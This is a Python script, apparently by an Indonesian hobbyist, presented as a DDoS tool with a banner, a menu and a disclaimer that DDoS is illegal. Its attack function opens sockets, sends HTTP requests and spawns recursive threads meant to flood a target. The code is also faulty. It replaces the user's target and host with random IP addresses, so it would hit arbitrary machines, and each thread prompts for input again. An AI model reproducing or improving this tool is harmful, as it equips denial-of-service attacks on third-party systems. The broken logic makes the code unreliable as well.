#!/usr/bin/env python
#DDOS By M24-py
#11:52PM Fri, 25 Dec 2K20
#aowkaokwowk
#Warna
import os,threading,socket,time,random
from time import sleep 

W = '\033[1;37m'
B = '\033[1;34m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
#
banner = """
{}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{}
____  ____   ___  ____
|  _ \|  _ \ / _ \/ ___|   BY M24-PY 
| | | | | | | | | \___ \   
| |_| | |_| | |_| |___) |  v.1.2-0 Beta 
|____/|____/ \___/|____/   IG : a.doge_

{}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{}
"""
banmer = """

1 > SEᖇᗩᑎG        69 > KEᒪᑌᗩᖇ

2 > TEᑎTᗩᑎG

"""
def about():
  os.system("clear")
  sleep(0.5)
  print(60 * '-' + W)
  sleep(0.1)
  print("M24 PYTHON DDOS SCRIPT")
  sleep(0.1)
  print(60 * '-' + W)
  print("")
  sleep(0.1)
  print("Cheems-M24")
  sleep(0.1)
  print(60 * '-' + W)
  sleep(1.5) 
  main_menu() 
def cheems():
  os.system("clear")
  sleep(0.5)
  print(50 * '-' + W)
  sleep (0.1)
  print(G + "Cheems")
  print(50 * '-' + W)
  sleep(1)
  os.system("clear")
#
asu = 0
def attacc():
  os.system("clear")
  sleep(1.5)
  print(60 * '-' + W)
  sleep(0.1)
  target = input("Masukkan IP Target : ")
  a = str(random.randint(1,254))
  b = str(random.randint(1,254))
  c = str(random.randint(1,254))
  d = str(random.randint(1,254))
  dot = "."
  target = a + dot + b + dot + c + dot + d
  sleep(0.1)
  host = input("Host : ")
  a = str(random.randint(1,254))
  b = str(random.randint(1,254))
  c = str(random.randint(1,254))
  d = str(random.randint(1,254))
  dot = "."
  host = a + dot + b + dot + c + dot + d
  sleep(0.1)
  port = int(input("Port : "))
  sleep(0.1)
  packet = int(input("Jumlah Packet : "))
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target, port))         
  s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
  s.sendto(("Host: " + host + "\r\n\r\n").encode('ascii'), (target, port))
  
    
  s.close() 

  for i in range(packet):
      thread = threading.Thread(target = attacc)
      thread.start()
      global asu
      asu += 1
      sleep(0.1) 
      print(asu)
      
  
def main_menu():
  os.system("clear")
  print(Y + banner)
  sleep(0.1)
  print(G + banmer)
  pil = int(input(G + "> " ))
  if pil == 1:
    attacc()
  elif pil == 2:
    about ()
  elif pil == 69:
    cheems()
  else:
    cheems()
   
  
def disc():
  sleep(0.5)
  print(60 * '-' + W)
  sleep(0.1)
  print("Perhatian [!] ")
  sleep(0.1)
  print("")
  print("DDOS Itu Perbuatan Illegal ! ")
  sleep(0.1)
  print("")
  print("Saya Tidak Bertanggung jawab jika")
  sleep(0.1)
  print("")
  print("Terjadi Hal² Yang Tidak diinginkan")
  sleep(0.1)
  print(60 * '-' + W)
  xn = str(input("Dengan Menekan enter, Saya paham "))
  sleep(1.5)
  main_menu() 
 
disc()
  

